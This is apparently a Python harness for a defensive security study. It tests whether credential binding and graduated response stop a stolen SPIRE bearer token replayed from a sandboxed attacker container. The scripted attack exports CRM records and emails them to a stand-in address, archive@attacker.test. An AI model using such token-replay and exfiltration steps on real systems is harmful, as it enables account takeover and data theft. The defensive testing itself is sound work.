"""Scripted (no LLM) credential-binding and graduated-response mechanism study.

Per run: fresh SPIRE JWT-SVID (TTL 300 s), fresh task namespace. The legitimate agent-client does a fixed task;
THEFT_AFTER seconds after receipt the bearer token (only) is replayed from the attacker container: a burst
(crm.export offset5 limit5, email.send to archive@attacker.test) then a files.read probe every PROBE_INTERVAL s
until first denial or TTL+WINDOW seconds after receipt. The legitimate agent then makes one more request.
This is mechanism verification against a scripted attacker, not a hypothesis test.
"""
from __future__ import annotations

import argparse
import concurrent.futures
import copy
import hashlib
import json
import platform
import random
import statistics
import subprocess
import sys
import threading
import time
import uuid
from pathlib import Path

from .audit import attribution, tamper_suite, verify
from .common import ROOT, canonical, digest, write_json
from .fixtures import call
from .runner import admin_get, admin_post, container_request

CONDITIONS = ('C1', 'C2', 'C2-AS', 'C3', 'C3-AS')
BOUND = ('C3', 'C3-AS')
THEFT_AFTER = 30
WINDOW = 30
ATTACKER_MAIL = 'archive@attacker.test'
BURST = [call('crm.export', offset=5, limit=5), call('email.send', to=ATTACKER_MAIL, body='Customer data archive')]
PROBE = call('files.read', path='brief')
LEGIT_TASK = [call('files.read', path='brief'), call('crm.export', offset=0, limit=5)]
C2_FIELDS = {'principal', 'agent', 'task_id', 'delegation_chain', 'policy_decision', 'origin', 'expected_origin'}
RUNTIME_FILES = {'pa': ['testbed/service.py', 'testbed/common.py', 'testbed/binding.py'],
                 'gateway': ['testbed/service.py', 'testbed/common.py', 'testbed/binding.py'],
                 'agent-client': ['testbed/client.py', 'testbed/binding.py', 'testbed/probe.py'],
                 'attacker': ['testbed/client.py', 'testbed/binding.py', 'testbed/probe.py']}
FREEZE_FILES = ['testbed/binding_study.py', 'testbed/binding.py', 'testbed/service.py', 'testbed/client.py', 'infra/opa/policy.rego',
                'analysis/binding_study.py', 'scripts/collect_binding_study.py', 'docs/binding-study-protocol.md']


def delegation():
    return {'principal': 'principal:analyst', 'chain': ['principal:analyst', 'agent:research'], 'actions': ['files.read', 'crm.read', 'crm.export'],
            'recipients': ['analyst@corp.test'], 'vendors': [], 'max_records': 10, 'max_payment': 100, 'max_per_records': 5, 'max_per_payment': 50,
            'expected_calls': copy.deepcopy(LEGIT_TASK)}


def manifest(config):
    cells = [{'cell_id': '%s-%02d' % (c, r), 'condition': c, 'replicate': r, 'ttl_seconds': config.get('ttl_seconds', 300)}
             for r in range(config.get('repeats', 1)) for c in config.get('conditions', CONDITIONS)]
    random.Random(config.get('seed', 4603)).shuffle(cells)
    for index, cell in enumerate(cells): cell['order'] = index
    return cells


def validate_config(config):
    if config.get('phase') not in ('pilot', 'full'): raise ValueError('Unknown phase')
    selected = config.get('conditions', list(CONDITIONS))
    if not selected or len(set(selected)) != len(selected) or any(c not in CONDITIONS for c in selected): raise ValueError('Invalid conditions')
    for field, high in (('repeats', 100), ('concurrency', 8)):
        value = config.get(field, 1)
        if isinstance(value, bool) or not isinstance(value, int) or not 1 <= value <= high: raise ValueError('Invalid ' + field)
    if config.get('phase') == 'full': validate_freeze(config)


def lf_hash(name): return hashlib.sha256((ROOT / name).read_bytes().replace(b'\r\n', b'\n')).hexdigest()


def validate_freeze(config):
    freeze = json.loads((ROOT / 'configs' / 'binding-study-freeze.json').read_text(encoding='utf-8'))
    if freeze.get('status') != 'frozen' or digest(config) != freeze.get('config_sha256'): raise ValueError('Configuration differs from frozen binding study')
    for name, expected in freeze['file_hashes'].items():
        if lf_hash(name) != expected: raise ValueError('Frozen source changed: ' + name)
    return freeze


def make_freeze(config_path):
    config = json.loads(Path(config_path).read_text(encoding='utf-8'))
    return {'status': 'frozen', 'protocol_id': config['protocol_id'], 'config_file': str(config_path), 'config_sha256': digest(config),
            'hash_scheme': 'sha256 of LF-normalized bytes', 'file_hashes': {n: lf_hash(n) for n in FREEZE_FILES}}


def verify_runtime():
    program = ('import hashlib,json,sys; from pathlib import Path; names=json.load(sys.stdin); '
               'print(json.dumps({n:hashlib.sha256(Path("/app",n).read_bytes()).hexdigest() for n in names}))')
    checks = []
    for service, names in RUNTIME_FILES.items():
        out = subprocess.run(['docker', 'compose', 'exec', '-T', service, 'python', '-c', program], input=json.dumps(names), cwd=ROOT,
                             text=True, capture_output=True, timeout=30, check=True)
        got = json.loads(out.stdout)
        checks.append({'service': service, 'matches': {n: got[n] in (lf_hash(n), hashlib.sha256((ROOT / n).read_bytes()).hexdigest()) for n in names}})
    return {'passed': all(all(c['matches'].values()) for c in checks), 'checks': checks, 'created_at': time.time()}


def executed(row):
    d = row.get('data') or {}
    return row.get('status') == 200 and d.get('outcome') == 'executed' and d.get('allowed') is True


def reason_of(row):
    d = row.get('data') or {}
    return d.get('reason') if row.get('status') == 200 else 'http_%s' % row.get('status')


def median(values): return statistics.median(values) if values else None


def run_metrics(condition, legit, attacker, independent, audits, checkpoint, window_end_s):
    """Pure per-run metric extraction. ``attacker`` rows carry kind/elapsed_seconds; ``legit`` rows carry label."""
    bursts = [r for r in attacker if r.get('kind') == 'burst']; probes = [r for r in attacker if r.get('kind') == 'probe']
    allowed = [r for r in attacker if executed(r)]
    denied_probe = next((r for r in probes if not executed(r)), None)
    last_success = max((r['elapsed_seconds'] for r in allowed), default=0.0)
    ids = {r['request']['request_id'] for r in attacker if r.get('request')}
    writes = [w for t in independent.values() for w in t['write_calls'] if w['request_id'] in ids]
    flagged = [a for a in audits if a.get('response_action')]
    task = [r for r in legit if r['label'].startswith('task')]; after = next((r for r in legit if r['label'] == 'after_attack'), None)
    latency = [r['latency_ms'] for r in legit if r.get('latency_ms') is not None]
    integrity = verify(audits, checkpoint); tamper = tamper_suite(audits, checkpoint)
    c2 = condition != 'C1'
    return {
        'replay_attempts': len(attacker), 'replay_attempts_allowed': len(allowed), 'first_attacker_success': bool(allowed),
        'burst_export_allowed': any(executed(r) and r['request']['action'] == 'crm.export' for r in bursts),
        'burst_email_allowed': any(executed(r) and r['request']['action'] == 'email.send' for r in bursts),
        'first_burst_reason': reason_of(bursts[0]) if bursts else None,
        'exposure_seconds': last_success if allowed else 0.0, 'event_observed': denied_probe is not None,
        'first_denial_seconds': denied_probe['elapsed_seconds'] if denied_probe else None,
        'censored_at_seconds': None if denied_probe else max((r['elapsed_seconds'] for r in probes), default=0.0),
        'first_denial_reason': reason_of(denied_probe) if denied_probe else None, 'window_seconds': window_end_s,
        'detection_to_containment_ms': next((a['detection_to_containment_ms'] for a in flagged if a.get('detection_to_containment_ms') is not None), None),
        'response_actions': [a['response_action'] for a in flagged],
        'legit_task_completed': len(task) == len(LEGIT_TASK) and all(executed(r) for r in task),
        'legit_after_attack_allowed': bool(after and executed(after)), 'legit_after_attack_reason': reason_of(after) if after else None,
        'attacker_committed_writes': len(writes), 'attacker_committed_records': sum(w['response'].get('records', 0) for w in writes),
        'attacker_email_committed': any(w['action'] == 'email.send' for w in writes),
        'audit_valid': bool(integrity['valid']), 'audit_count': len(audits),
        'audit_c2_fields_complete': sum(C2_FIELDS <= set(a) for a in audits) if c2 else None,
        'audit_flags_impersonation': attribution(audits) == 'impersonation' if c2 else None,
        'tamper_cases': len(tamper), 'tamper_detected': sum(not v['valid'] for v in tamper.values()),
        'legit_latency_ms_median': median(latency), 'legit_sign_ms_median': median([r['sign_ms'] for r in legit if r.get('sign_ms') is not None]),
        'legit_authorization_ms_median': median([r['authorization_ms'] for r in legit if r.get('authorization_ms') is not None]),
    }


def _append(path, row):
    with path.open('a', encoding='utf-8') as stream: stream.write(canonical(row) + '\n')


def _seal(folder):
    write_json(folder / 'raw-manifest.json', {'hash_scheme': 'sha256-bytes', 'files': {
        p.name: hashlib.sha256(p.read_bytes()).hexdigest() for p in folder.iterdir() if p.is_file() and p.name != 'raw-manifest.json'}})


def run_one(cell, config, batch):
    from scripts.spire import issue, delete_registration
    from scripts.tool_evidence import snapshot
    condition = cell['condition']; bound = condition in BOUND
    run_id = 'bs' + uuid.uuid4().hex; folder = Path(batch) / 'runs' / run_id; folder.mkdir(parents=True)
    summary = {**cell, 'run_id': run_id, 'phase': config['phase'], 'protocol_id': config['protocol_id'], 'study_kind': 'binding-response',
               'mode': 'scripted', 'status': 'running', 'started_at': time.time()}
    write_json(folder / 'summary.json', summary)
    legit, attacker, audits = [], [], []; entry_id = None; created = False; keyed = False; window = 0
    checkpoint = {'count': 0, 'hash': '0' * 64}
    theft_after = config.get('theft_after_seconds', THEFT_AFTER); window_after = config.get('window_after_expiry_seconds', WINDOW)
    interval = config.get('probe_interval_seconds', 5)
    try:
        identity = issue(run_id, cell['ttl_seconds']); token = identity.pop('token'); entry_id = identity['entry_id']; t0 = time.monotonic()
        summary['received_at'] = time.time(); exp = identity['claims']['exp']
        origin = container_request('agent-client', {'url': 'http://gateway:8000/whoami'})['data']['origin']
        setup = {**cell, **identity, 'condition': condition, 'run_id': run_id, 'expected_origin': origin, 'delegation': delegation(),
                 'issuance': {k: v for k, v in identity.items() if k not in ('jwks', 'claims')}}
        if bound:
            key = container_request('agent-client', {'mode': 'dpop_keygen', 'run_id': run_id})['data']; keyed = True
            setup['binding_jkt'] = key['jkt']; summary['binding_jkt'] = key['jkt']
        write_json(folder / 'trusted-setup.json', setup)
        admin_post('/control/runs', setup); created = True
        before = snapshot(run_id); write_json(folder / 'tool-before.json', before)
        if any(t['write_calls'] for t in before.values()): raise RuntimeError('Fresh task has pre-existing committed writes')

        def audit_of(result):
            audits.append(result['audit']); _append(folder / 'audit.jsonl', result['audit'])

        def agent_call(action, label):
            request = {'run_id': run_id, 'request_id': uuid.uuid4().hex, **action}
            observed = container_request('agent-client', {'url': 'http://gateway:8000/tool', 'data': request, 'token': token, 'dpop': bound})
            row = {'label': label, 'request': request, 'status': observed['status'], 'data': observed['data'], 'latency_ms': observed['latency_ms'],
                   'sign_ms': observed.get('sign_ms'), 'authorization_ms': observed['data'].get('authorization_ms'), 'time': observed['time']}
            legit.append(row); _append(folder / 'legit.jsonl', row); audit_of(observed['data'])
            if observed['data']['outcome'] == 'infrastructure_error': raise RuntimeError('Gateway infrastructure failure')

        for index, action in enumerate(LEGIT_TASK): agent_call(action, 'task%d' % index)
        time.sleep(max(0, t0 + theft_after - time.monotonic()))
        summary['theft_at'] = time.time(); window = exp + window_after - time.time()
        proc = subprocess.Popen(['docker', 'compose', 'exec', '-T', 'attacker', 'python', '-m', 'testbed.client'], stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=ROOT)
        proc.stdin.write(canonical({'mode': 'replay', 'url': 'http://gateway:8000/tool', 'token': token, 'interval': interval, 'window': window,
                                    'burst': [{'run_id': run_id, **a} for a in BURST], 'probe': {'run_id': run_id, **PROBE}})); proc.stdin.close()
        killer = threading.Timer(window + 120, proc.kill); killer.start()
        try:
            for line in proc.stdout:
                row = json.loads(line); _append(folder / 'attacker.jsonl', row)
                if row.get('kind') == 'burst_done': agent_call(PROBE, 'after_attack'); continue
                attacker.append(row)
                if row['status'] == 0 or row['status'] >= 500: raise RuntimeError('Attacker transport failure')
                if row['status'] == 200: audit_of(row['data'])
            proc.wait(timeout=30)
        finally: killer.cancel()
        if proc.returncode: raise RuntimeError('Attacker process failed: ' + proc.stderr.read()[-500:])
        summary['status'] = 'completed'
    except Exception as error:
        summary.update(status='infrastructure_failure', error=type(error).__name__ + ': ' + str(error))
    finally:
        if created:
            try:
                independent = snapshot(run_id); write_json(folder / 'tool-ground-truth.json', independent)
                audits.sort(key=lambda a: a['sequence'])
                checkpoint = {'count': len(audits), 'hash': audits[-1]['hash'] if audits else '0' * 64}
                control = admin_get('/control/' + run_id + '/evidence'); write_json(folder / 'control-evidence.json', control)
                write_json(folder / 'checkpoint.json', checkpoint); write_json(folder / 'audit-verification.json', verify(audits, checkpoint))
                write_json(folder / 'tamper.json', tamper_suite(audits, checkpoint))
                summary['control_audit_count_matches'] = control['audit_count'] == len(audits)
                summary['control_state'] = {k: control[k] for k in ('revoked', 'suspended')}
                if summary['status'] == 'completed':
                    summary.update(run_metrics(condition, legit, attacker, independent, audits, checkpoint, window))
                    if not summary['audit_valid'] or not summary['control_audit_count_matches']: summary['status'] = 'evidence_failure'
            except Exception as error:
                summary.update(status='evidence_failure', evidence_error=type(error).__name__ + ': ' + str(error))
            try: admin_post('/control/' + run_id + '/retire')
            except Exception as error: write_json(folder / 'retirement-error.json', {'error': str(error)})
        if keyed:
            try: container_request('agent-client', {'mode': 'dpop_cleanup', 'run_id': run_id})
            except Exception as error: write_json(folder / 'key-cleanup-error.json', {'error': str(error)})
        if entry_id:
            try: delete_registration(entry_id)
            except Exception as error: write_json(folder / 'cleanup-error.json', {'error': str(error)})
        summary['finished_at'] = time.time(); write_json(folder / 'summary.json', summary); _seal(folder)
    return summary


def run_batch(config, output):
    validate_config(config); output = Path(output); output.mkdir(parents=True, exist_ok=False)
    verification = verify_runtime(); write_json(output / 'runtime-verification.json', verification)
    if not verification['passed']: raise RuntimeError('Runtime bytes in containers differ from source; rebuild first')
    if config['phase'] == 'full': write_json(output / 'freeze.json', validate_freeze(config))
    cells = manifest(config); hashes = {}
    for directory in ('testbed', 'infra', 'scripts', 'analysis', 'configs', 'tests'):
        for path in (ROOT / directory).rglob('*'):
            if path.is_file() and '__pycache__' not in path.parts:
                relative = path.relative_to(ROOT); target = output / 'source' / relative; target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(path.read_bytes()); hashes[relative.as_posix()] = hashlib.sha256(path.read_bytes()).hexdigest()
    for name in ['compose.yaml', 'Dockerfile', 'requirements.lock.txt', 'docs/binding-study-protocol.md']:
        target = output / 'source' / name; target.parent.mkdir(parents=True, exist_ok=True); target.write_bytes((ROOT / name).read_bytes())
        hashes[name] = hashlib.sha256((ROOT / name).read_bytes()).hexdigest()
    git = lambda *a: subprocess.run(['git', *a], cwd=ROOT, text=True, capture_output=True).stdout.strip()
    write_json(output / 'config.json', config)
    write_json(output / 'manifest.json', {'cells': cells, 'count': len(cells), 'created_at': time.time(), 'phase': config['phase'], 'seed': config.get('seed', 4603),
               'study_kind': 'binding-response', 'git_commit': git('rev-parse', 'HEAD'),
               'git_dirty_paths': git('status', '--porcelain', '--', 'testbed', 'infra', 'scripts', 'analysis', 'configs').splitlines(),
               'source_sha256': hashes, 'python': sys.version, 'platform': platform.platform(), 'theft_after_seconds': config.get('theft_after_seconds', THEFT_AFTER),
               'attacker_burst': BURST, 'attacker_probe': PROBE, 'legit_task': LEGIT_TASK})
    results = []

    def progress():
        write_json(output / 'progress.json', {'planned': len(cells), 'completed': len(results), 'failures': sum(r['status'] != 'completed' for r in results)})

    with concurrent.futures.ThreadPoolExecutor(max_workers=config.get('concurrency', 1)) as pool:
        for future in concurrent.futures.as_completed([pool.submit(run_one, c, config, output) for c in cells]):
            results.append(future.result()); progress()
            print(canonical({k: results[-1].get(k) for k in ('run_id', 'cell_id', 'status', 'replay_attempts_allowed', 'exposure_seconds')}), flush=True)
        # One infrastructure-failure rerun per cell, linked to the original; never selected on outcome.
        redo = [dict(c, rerun_of=r['run_id']) for r in list(results) if r['status'] == 'infrastructure_failure' for c in cells if c['cell_id'] == r['cell_id']]
        for future in concurrent.futures.as_completed([pool.submit(run_one, c, config, output) for c in redo]):
            results.append(future.result()); progress()
    original_failed = sum(r['status'] != 'completed' and 'rerun_of' not in r for r in results)
    remaining = len(cells) - len({r['cell_id'] for r in results if r['status'] == 'completed'})
    status = {'planned': len(cells), 'observed': len(results), 'original_failures': original_failed, 'reruns': len(redo), 'remaining_failures': remaining}
    write_json(output / 'batch-status.json', status)
    return status


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--config', required=True); parser.add_argument('--output', required=True)
    args = parser.parse_args()
    if run_batch(json.loads(Path(args.config).read_text(encoding='utf-8')), args.output)['remaining_failures']: raise SystemExit(2)


if __name__ == '__main__': main()
